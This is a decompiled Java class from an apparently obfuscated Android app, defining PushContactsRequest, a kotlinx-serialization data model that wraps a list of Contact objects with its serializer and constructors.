package com.hawkshaw.library.datalayer.models;

import B3.f;
import E3.C0020d;
import E3.q0;
import java.util.List;
import kotlinx.serialization.KSerializer;
import w3.w;

@f
public final class PushContactsRequest {
    /* access modifiers changed from: private */
    public static final KSerializer[] $childSerializers = {new C0020d(Contact$$serializer.INSTANCE, 0)};
    public static final Companion Companion = new Companion((j3.f) null);
    private final List<Contact> contacts;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return PushContactsRequest$$serializer.INSTANCE;
        }
    }

    public /* synthetic */ PushContactsRequest(int i5, List list, q0 q0Var) {
        if (1 == (i5 & 1)) {
            this.contacts = list;
        } else {
            w.x(i5, 1, PushContactsRequest$$serializer.INSTANCE.getDescriptor());
            throw null;
        }
    }

    public static /* synthetic */ void getContacts$annotations() {
    }

    public final List<Contact> getContacts() {
        return this.contacts;
    }

    public PushContactsRequest(List<Contact> list) {
        this.contacts = list;
    }
}
